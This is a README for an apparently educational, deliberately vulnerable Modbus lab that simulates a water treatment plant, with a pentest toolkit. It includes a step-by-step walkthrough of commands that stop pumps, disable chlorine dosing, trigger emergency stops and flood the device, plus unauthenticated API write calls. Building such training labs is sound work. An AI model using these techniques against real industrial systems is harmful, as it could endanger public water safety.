# M0DBUS GR1D 🏭

> A deliberately vulnerable Modbus TCP lab for hands-on OT/ICS security learning.  
> Simulates a **Municipal Water Treatment Plant** with a real Modbus PLC, live SCADA HMI, and a purpose-built pentesting toolkit.

<!-- SCREENSHOT: Terminal showing PLC simulator running + HMI dashboard side by side -->

---

## ⚠️ Disclaimer

This lab is built for **authorized educational use only**.  
All components are intentionally vulnerable. Never deploy this on a production network or use these techniques against systems you don't own.  
Unauthorized access to ICS/OT systems is a criminal offense.

---

## 📖 Lab Guide

All the activities/actions that can be performed with this lab are compiled as a manual, which you can refer and have a detailed look on the lab. This will help you understand the actions in a deep way. You can get it here,  [Lan Manual →](https://github.com/aravind0x7/m0dbus_grid/blob/main/Modbus_OT_Pentest_Lab_Guide.pdf).

---

## What's Inside

```
m0dbus_gr1d/
├── plc_simulator.py     ← Modbus TCP server — Water Treatment Plant PLC
├── hmi_server.py        ← Flask REST API backend for the HMI
├── index.html           ← Industrial SCADA web dashboard
├── modisy.py            ← Custom Modbus pentesting toolkit
└── m0dbus_gr1d.py         ← One-command lab launcher
```

| Component | Description | Port |
|---|---|---|
| **PLC Simulator** | Full Modbus TCP server with live process simulation | `5020` |
| **HMI Dashboard** | Industrial SCADA web interface, updates in real time | `8080` |
| **modisy** | Pentest toolkit — 11 attack modules, zero dependencies | — |

---

## The Scenario

You are assessing a **Water Treatment Plant** SCADA system.  
The PLC controls pumps, valves, chlorine dosing, UV sterilization, and tank levels — all over unauthenticated Modbus TCP.

Every attack you run reflects live on the HMI dashboard. Pumps stop. Alarms fire. Levels drop. The process reacts in real time, just like a real plant would.

<!-- SCREENSHOT: HMI dashboard showing the process diagram with active pump indicators -->

---

## Requirements

- Python 3.8+
- Flask

```bash
pip install flask
```

> No external Modbus library needed. The PLC simulator and modisy are built on raw sockets.

---

## Quick Start

**Clone the repo**

```bash
git clone https://github.com/aravind0x7/m0dbus_gr1d.git
cd m0dbus_gr1d
```

**Install dependencies**

```bash
pip install flask
```

**Launch everything at once**

```bash
python3 m0dbus_gr1d.py
```

Or start each component individually:

```bash
# Terminal 1 — PLC Simulator
python3 plc_simulator.py 5020

# Terminal 2 — HMI Server
PLC_PORT=5020 python3 hmi_server.py

# Open the dashboard
http://localhost:8080
```

<!-- SCREENSHOT: Three terminals running — PLC, HMI, and modisy -->

---

## Modbus Memory Map

### Coils — FC01 read / FC05 write

| Address | Name | Default | Impact if Written |
|---|---|---|---|
| `0x00` | `PUMP_1_RUN` | ON | Main flow stops |
| `0x01` | `PUMP_2_RUN` | OFF | Backup pump control |
| `0x02` | `VALVE_INLET` | ON | Blocks all intake |
| `0x03` | `VALVE_OUTLET` | ON | Blocks outflow, pressure builds |
| `0x04` | `CHLORINE_DOSING` | ON | Chemical treatment stops |
| `0x05` | `UV_STERILIZER` | ON | Sterilization disabled |
| `0x06` | `ALARM_ACTIVE` | OFF | Alarm state |
| **`0x07`** | **`EMERGENCY_STOP`** | **OFF** | **All pumps halt instantly** |
| `0x08` | `PUMP_3_RUN` | OFF | Chemical pump |
| `0x09` | `HEATER_ON` | OFF | Water heater |

### Holding Registers — FC03 read / FC06 write / FC10 bulk write

| Address | Name | Default | Notes |
|---|---|---|---|
| `4x00` | `PUMP1_SETPOINT` | 500 | Flow target L/min |
| `4x01` | `TANK_LEVEL_HI` | 85 | High alarm % |
| `4x02` | `TANK_LEVEL_LO` | 15 | Low alarm % |
| `4x03` | `PRESSURE_MAX` | 500 | Max pressure kPa |
| `4x04` | `CHLORINE_SP` | 150 | Target Cl ppm × 100 |
| `4x08` | `DOSING_RATE` | 65 | Dosing rate % |
| **`4x09`** | **`MAINT_CODE`** | **`0xDEAD`** | **⚠️ Plaintext credential in register** |
| `4x10` | `SYSTEM_MODE` | 0 | 0=Auto 1=Manual 2=Maint 3=Emergency |

### Input Registers — FC04 read only (live sensors)

| Address | Name | Unit |
|---|---|---|
| `3x00` | `FLOW_RATE` | L/min |
| `3x01` | `TANK_LEVEL` | % |
| `3x02` | `INLET_PRESSURE` | kPa |
| `3x04` | `WATER_TEMP` | °C × 10 |
| `3x06` | `PH_VALUE` | pH × 100 |
| `3x07` | `CHLORINE_PPM` | ppm × 100 |

---

## modisy — Pentest Toolkit

**modisy** is the purpose-built attack tool for this lab.  
Pure Python, no external dependencies, raw Modbus TCP at the socket level.

<!-- SCREENSHOT: modisy banner in terminal -->

### Usage

```bash
python3 modisy.py [options] <command>

Options:
  -H / --host    Target IP    (default: 127.0.0.1)
  -p / --port    Target port  (default: 502)
  -u / --unit    Modbus Unit ID (default: 1)
  -v / --verbose Verbose output
```

### Commands

| Command | Function Code | Description |
|---|---|---|
| `scan` | FC03 | Sweep unit IDs to discover devices |
| `dump` | FC01 / FC03 / FC04 | Full memory dump — coils, sensors, registers |
| `enum` | FC11 / FC43 | Device fingerprinting — firmware and vendor info |
| `read-secret` | FC03 | Extract maintenance credential from HR[9] |
| `coil-write` | FC05 | Write a single coil — pump/valve control |
| `reg-write` | FC06 | Write a single holding register |
| `bulk-write` | FC16 | Write multiple registers in one packet |
| `estop` | FC05 | Trigger emergency stop on coil 7 |
| `fuzz` | FC01–FC7F | Fuzz all 127 function codes |
| `flood` | FC03 | DoS test — rate limiting check |
| `replay` | Raw PDU | Send a raw hex Modbus packet |

---

## Attack Walkthrough

### 1. Discover the Device

```bash
python3 modisy.py -p 5020 scan --max-uid 10
```

<!-- SCREENSHOT: scan output showing Unit ID 1 responding -->

### 2. Dump the Full Memory Map

```bash
python3 modisy.py -p 5020 dump
```

<!-- SCREENSHOT: dump output showing coils, sensors, and HR[9] = 0xDEAD -->

### 3. Extract the Maintenance Credential

```bash
python3 modisy.py -p 5020 read-secret
```

<!-- SCREENSHOT: read-secret output showing 0xDEAD -->

### 4. Fingerprint the Device

```bash
python3 modisy.py -p 5020 enum
```

<!-- SCREENSHOT: enum output showing firmware version and vendor string -->

### 5. Stop the Main Pump

```bash
python3 modisy.py -p 5020 coil-write 0 0
```

> Watch the HMI — flow rate drops, pump indicator goes dark.

<!-- SCREENSHOT: HMI before and after pump stop -->

### 6. Disable Chlorine Dosing (Water Quality Attack)

```bash
# Stop dosing pump
python3 modisy.py -p 5020 coil-write 4 0

# Zero the chlorine setpoint
python3 modisy.py -p 5020 reg-write 4 0
```

> Chlorine PPM begins falling on the dashboard. No alarm fires immediately — this is intentionally subtle.

### 7. Bulk Setpoint Override (FC16)

```bash
python3 modisy.py -p 5020 bulk-write 0 9999,5,99,1,0
```

Five setpoints overridden in a single packet. Alarms fire across the board on the HMI.

<!-- SCREENSHOT: HMI with alarm banner active and registers showing overridden values -->

### 8. Trigger Emergency Stop

```bash
python3 modisy.py -p 5020 estop
```

> All pumps halt. The HMI goes into full alarm state.

<!-- SCREENSHOT: HMI emergency stop state — red banner, dark pump indicators -->

### 9. Fuzz All Function Codes

```bash
python3 modisy.py -p 5020 fuzz -v
```

### 10. DoS — Rate Limiting Test

```bash
python3 modisy.py -p 5020 flood --count 2000
```

### Recovery — Reset Everything

```bash
# Release emergency stop
python3 modisy.py -p 5020 coil-write 7 0

# Restart main pump
python3 modisy.py -p 5020 coil-write 0 1

# Restore setpoints to normal
python3 modisy.py -p 5020 bulk-write 0 500,85,15,500,150

# Re-enable chlorine dosing
python3 modisy.py -p 5020 coil-write 4 1
```

---

## Intentional Vulnerabilities

| ID | Layer | Description |
|---|---|---|
| V-001 | PLC | No authentication on Modbus TCP |
| V-002 | PLC | No input validation on writes |
| V-003 | PLC | All function codes enabled — no whitelist |
| V-004 | PLC | FC11 / FC43 disclose firmware and vendor info |
| V-005 | PLC | No rate limiting |
| V-006 | PLC | FC16 bulk write allows mass process override |
| V-007 | PLC | Exception responses reveal address structure |
| V-008 | PLC | No write audit logging at PLC level |
| V-HMI-001 | HMI | No authentication on web interface |
| V-HMI-002 | HMI | Unauthenticated write API |
| V-HMI-003 | HMI | Debug mode enabled — stack traces exposed |
| V-HMI-004 | HMI | CORS wildcard — any origin can send writes |
| V-HMI-005 | HMI | Audit log accessible without credentials |
| V-HMI-006 | HMI | Maintenance code readable via `/api/status` |

---

## HMI REST API

The HMI exposes a REST API — all endpoints are unauthenticated by design.

```bash
# Read full PLC state (includes maintenance code)
curl http://localhost:8080/api/status

# Write a coil
curl -X POST http://localhost:8080/api/coil/7 \
  -H "Content-Type: application/json" \
  -d '{"value": true}'

# Write a register
curl -X POST http://localhost:8080/api/register/9 \
  -H "Content-Type: application/json" \
  -d '{"value": 65535}'

# Bulk register write
curl -X POST http://localhost:8080/api/bulk_write \
  -H "Content-Type: application/json" \
  -d '{"start": 0, "values": [9999, 5, 99, 1, 0]}'

# Read audit log (unauthenticated)
curl http://localhost:8080/api/audit

# Device info leak
curl http://localhost:8080/api/device_info
```

---

## Compatible Tools

The lab works with any standard Modbus tool, not just modisy.

| Tool | Usage |
|---|---|
| **BusPwn** | GUI Modbus framework — `github.com/aravind0x7/BusPwn` |
| **nmap** | `nmap -p 5020 --script modbus-discover 127.0.0.1` |
| **Metasploit** | `use auxiliary/scanner/scada/modbus_findunitid` |
| **Wireshark** | Filter: `tcp.port == 5020` or `modbus` |
| **Scapy** | Craft and replay raw Modbus packets |

---

## Learning Path

This lab is Part 5 of the **Getting Started with OT Security** blog series.

| Part | Topic | Link |
|---|---|---|
| Part 1 | OT Fundamentals | [Read →](https://aravind07.medium.com/getting-started-with-ot-security-fundamentals-you-need-to-know-part-1-886694b4f40c) |
| Part 2 | OT Protocols | [Read →](https://aravind07.medium.com/getting-started-with-ot-security-understanding-ot-protocols-part-2-b789b5e073f6) |
| Part 3 | Security Challenges | [Read →](https://aravind07.medium.com/getting-started-with-ot-security-understanding-ot-security-challenges-part-3-dccd4dbc8f26) |
| Part 4 | Attacker's Mindset | [Read →](https://aravind07.medium.com/getting-started-with-ot-security-the-attackers-mindset-intro-to-ot-penetration-testing-part-4-2ff67134bf86) |
| **Part 5** | **Hands-On Modbus Pentesting** | **You are here** |

---

## Author

**Gnana Aravind K — aravind0x7**  
Hacktivist · OT-ICS-IoT Researcher · Bug Bounty Hunter · Robotics & Automation Engineer

[![GitHub](https://img.shields.io/badge/GitHub-aravind0x7-black?logo=github)](https://github.com/aravind0x7)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-gnana--aravind-blue?logo=linkedin)](https://www.linkedin.com/in/gnana-aravind)
[![Medium](https://img.shields.io/badge/Medium-aravind07-black?logo=medium)](https://aravind07.medium.com)
[![Instagram](https://img.shields.io/badge/Instagram-aravind0x7-E4405F?logo=instagram)](https://instagram.com/aravind0x7)

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

*If this lab helped you learn something, drop a ⭐ on the repo — it keeps the project going.*
